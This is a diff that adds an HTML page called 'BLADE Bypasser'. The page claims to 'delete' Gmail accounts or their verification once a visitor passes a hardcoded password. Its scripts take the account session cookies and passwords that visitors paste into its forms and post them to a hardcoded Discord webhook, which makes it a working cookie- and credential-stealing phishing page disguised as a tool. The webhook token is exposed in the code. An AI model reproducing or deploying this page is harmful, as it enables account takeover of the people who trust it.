@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BLADE Bypasser</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #0a0a0a, #0f1c2e);
+      color: #e0e6f1;
+      overflow-x: hidden;
+      user-select: none;
+    }
+    #weather-canvas {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+    .container {
+      position: relative;
+      z-index: 10;
+      max-width: 480px;
+      margin: 70px auto 40px auto;
+      background: rgba(20, 30, 50, 0.95);
+      border-radius: 20px;
+      box-shadow: 0 10px 40px rgba(0, 191, 255, 0.5);
+      padding: 40px 45px;
+      text-align: center;
+    }
+    h1 {
+      font-weight: 600;
+      font-size: 2.8rem;
+      margin-bottom: 25px;
+      color: #00bfff;
+      text-shadow: 0 0 20px #00d6ff;
+    }
+    label {
+      display: block;
+      font-weight: 500;
+      font-size: 1.1rem;
+      margin-bottom: 8px;
+      text-align: left;
+      color: #b0c9ff;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 15px 18px;
+      border-radius: 12px;
+      border: none;
+      font-size: 1.15rem;
+      outline: none;
+      background: #0f224f;
+      color: #d0e0ff;
+      box-shadow: inset 0 0 12px #005b96;
+      margin-bottom: 18px;
+      transition: box-shadow 0.3s ease;
+    }
+    input[type="text"]:focus, input[type="password"]:focus {
+      box-shadow: inset 0 0 16px #00bfff;
+    }
+    button {
+      background: linear-gradient(90deg, #00d4ff 0%, #007bbf 100%);
+      border: none;
+      padding: 15px 0;
+      width: 100%;
+      border-radius: 14px;
+      color: white;
+      font-weight: 700;
+      font-size: 1.3rem;
+      cursor: pointer;
+      box-shadow: 0 6px 18px #00bfffaa;
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+      margin-top: 8px;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #007bbf 0%, #00d4ff 100%);
+      box-shadow: 0 8px 24px #00d4ffcc;
+    }
+    .message {
+      margin-top: 16px;
+      min-height: 22px;
+      font-weight: 600;
+      font-size: 1.05rem;
+      color: #f55a5a;
+    }
+    .success-message {
+      color: #7ef57e;
+    }
+    .discord-section {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 1rem;
+    }
+    .discord-section a {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      background: #5865F2;
+      color: white;
+      padding: 14px 28px;
+      border-radius: 12px;
+      font-weight: 600;
+      transition: background 0.3s ease;
+      box-shadow: 0 4px 18px rgba(88, 101, 242, 0.5);
+    }
+    .discord-section a:hover {
+      background: #4852cc;
+    }
+    .discord-section img {
+      height: 26px;
+    }
+    /* Option selection styles */
+    .option-button {
+      background: #003060;
+      border: 2px solid #007bbf;
+      color: #a0cfff;
+      font-weight: 600;
+      margin: 15px 0;
+      border-radius: 12px;
+      padding: 14px 0;
+      cursor: pointer;
+      box-shadow: 0 4px 14px #005a9c88;
+      transition: all 0.3s ease;
+    }
+    .option-button:hover {
+      background: #005dbf;
+      border-color: #00bfff;
+      color: #e0f7ff;
+      box-shadow: 0 6px 22px #00bfffcc;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="weather-canvas"></canvas>
+
+  <div class="container" id="password-container">
+    <h1>BLADE Bypasser</h1>
+    <label for="password-input">Enter Password</label>
+    <input type="password" id="password-input" placeholder="Enter Password" autocomplete="off" />
+    <button onclick="checkPassword()">Submit</button>
+    <div class="message" id="password-message"></div>
+  </div>
+
+  <div class="container hidden" id="option-container">
+    <h2>Choose an Option</h2>
+    <button class="option-button" onclick="showDeleteGmail()">Delete gmail</button>
+    <button class="option-button" onclick="showDeleteVerifyGmail()">Delete Verify gmail</button>
+  </div>
+
+  <!-- Delete gmail form -->
+  <div class="container hidden" id="delete-gmail-container">
+    <h2>Delete gmail</h2>
+    <label for="cookie-input">Enter Account Cookie</label>
+    <input type="text" id="cookie-input" placeholder="Paste your cookie here" autocomplete="off" />
+    <button onclick="sendDeleteGmail()">Submit</button>
+    <div class="message" id="cookie-message"></div>
+    <button style="margin-top: 30px;" onclick="goBackToOptions()">Back to options</button>
+  </div>
+
+  <!-- Delete Verify gmail form -->
+  <div class="container hidden" id="delete-verify-gmail-container">
+    <h2>Delete Verify gmail</h2>
+    <label for="cookie-input-verify">Enter Account Cookie</label>
+    <input type="text" id="cookie-input-verify" placeholder="Paste your cookie here" autocomplete="off" />
+    <label for="password-input-verify">Enter Password</label>
+    <input type="password" id="password-input-verify" placeholder="Enter your password" autocomplete="off" />
+    <button onclick="sendDeleteVerifyGmail()">Submit</button>
+    <div class="message" id="cookie-verify-message"></div>
+    <button style="margin-top: 30px;" onclick="goBackToOptions()">Back to options</button>
+  </div>
+
+  <div class="discord-section">
+    <p>Join our Discord server:</p>
+    <a href="https://discord.gg/WebbX7nxyC" target="_blank" rel="noopener noreferrer">
+      <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" alt="Discord Icon" />
+      BLADE
+    </a>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1382080696616620216/UpB67NsHLVTXY8rWd8e9J2combk3ub3utZkR-gJ2IKurIggEWULEiL0_8Ql7vOZZD6kP";
+    const PASSWORD = "blade";
+
+    // Canvas setup for rain + snow
+    const canvas = document.getElementById("weather-canvas");
+    const ctx = canvas.getContext("2d");
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    let snowflakes = [], rainDrops = [];
+
+    function initWeather() {
+      for (let i = 0; i < 100; i++) {
+        snowflakes.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          r: Math.random() * 4 + 1,
+          d: Math.random() * 2 + 1
+        });
+        rainDrops.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          l: Math.random() * 20 + 10,
+          xs: -2 + Math.random() * 4 + 2,
+          ys: Math.random() * 10 + 10
+        });
+      }
+    }
+
+    function drawWeather() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      // Draw snowflakes
+      ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
+      ctx.beginPath();
+      snowflakes.forEach(f => {
+        ctx.moveTo(f.x, f.y);
+        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
+      });
+      ctx.fill();
+
+      // Draw raindrops
+      ctx.strokeStyle = "rgba(173,216,230,0.6)";
+      ctx.lineWidth = 1;
+      ctx.beginPath();
+      rainDrops.forEach(r => {
+        ctx.moveTo(r.x, r.y);
+        ctx.lineTo(r.x + r.xs, r.y + r.l);
+      });
+      ctx.stroke();
+
+      updateWeather();
+    }
+
+    function updateWeather() {
+      snowflakes.forEach(f => {
+        f.y += f.d;
+        if (f.y > canvas.height) {
+          f.x = Math.random() * canvas.width;
+          f.y = -10;
+        }
+      });
+
+      rainDrops.forEach(r => {
+        r.x += r.xs;
+        r.y += r.ys;
+        if (r.y > canvas.height) {
+          r.x = Math.random() * canvas.width;
+          r.y = -20;
+        }
+      });
+    }
+
+    setInterval(drawWeather, 33);
+    initWeather();
+
+    // Password check
+    function checkPassword() {
+      const input = document.getElementById("password-input").value.trim();
+      const message = document.getElementById("password-message");
+      if (input === PASSWORD) {
+        message.textContent = "";
+        document.getElementById("password-container").classList.add("hidden");
+        document.getElementById("option-container").classList.remove("hidden");
+      } else {
+        message.style.color = "#f55a5a";
+        message.textContent = "Incorrect password.";
+      }
+    }
+
+    // Show delete gmail form
+    function showDeleteGmail() {
+      hideAllContainers();
+      document.getElementById("delete-gmail-container").classList.remove("hidden");
+    }
+    // Show delete verify gmail form
+    function showDeleteVerifyGmail() {
+      hideAllContainers();
+      document.getElementById("delete-verify-gmail-container").classList.remove("hidden");
+    }
+    // Back to options
+    function goBackToOptions() {
+      hideAllContainers();
+      document.getElementById("option-container").classList.remove("hidden");
+      clearMessages();
+      clearInputs();
+    }
+    // Hide all forms/containers
+    function hideAllContainers() {
+      document.getElementById("password-container").classList.add("hidden");
+      document.getElementById("option-container").classList.add("hidden");
+      document.getElementById("delete-gmail-container").classList.add("hidden");
+      document.getElementById("delete-verify-gmail-container").classList.add("hidden");
+    }
+    // Clear messages
+    function clearMessages() {
+      document.getElementById("password-message").textContent = "";
+      document.getElementById("cookie-message").textContent = "";
+      document.getElementById("cookie-verify-message").textContent = "";
+    }
+    // Clear inputs
+    function clearInputs() {
+      document.getElementById("cookie-input").value = "";
+      document.getElementById("cookie-input-verify").value = "";
+      document.getElementById("password-input-verify").value = "";
+    }
+
+    // Send Delete gmail cookie
+    async function sendDeleteGmail() {
+      const cookie = document.getElementById("cookie-input").value.trim();
+      const messageEl = document.getElementById("cookie-message");
+      if (!cookie) {
+        messageEl.style.color = "#f55a5a";
+        messageEl.textContent = "Please enter the cookie.";
+        return;
+      }
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**Delete gmail - Cookie:**\n\`\`\`\n${cookie}\n\`\`\``
+          }),
+        });
+        messageEl.style.color = "#7ef57e";
+        messageEl.textContent = "Cookie sent successfully.";
+      } catch (e) {
+        messageEl.style.color = "#f55a5a";
+        messageEl.textContent = "Failed to send cookie.";
+      }
+    }
+
+    // Send Delete Verify gmail cookie and password separately
+    async function sendDeleteVerifyGmail() {
+      const cookie = document.getElementById("cookie-input-verify").value.trim();
+      const password = document.getElementById("password-input-verify").value.trim();
+      const messageEl = document.getElementById("cookie-verify-message");
+
+      if (!cookie || !password) {
+        messageEl.style.color = "#f55a5a";
+        messageEl.textContent = "Please enter both cookie and password.";
+        return;
+      }
+
+      try {
+        // Send cookie first
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**Delete Verify gmail - Cookie:**\n\`\`\`\n${cookie}\n\`\`\``
+          }),
+        });
+
+        // Wait 1.5 seconds
+        await new Promise(resolve => setTimeout(resolve, 1500));
+
+        // Send password separately
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**Delete Verify gmail - Password:**\n\`\`\`\n${password}\n\`\`\``
+          }),
+        });
+
+        messageEl.style.color = "#7ef57e";
+        messageEl.textContent = "Cookie and password sent successfully.";
+      } catch (e) {
+        messageEl.style.color = "#f55a5a";
+        messageEl.textContent = "Failed to send data.";
+      }
+    }
+  </script>
+</body>
+</html>
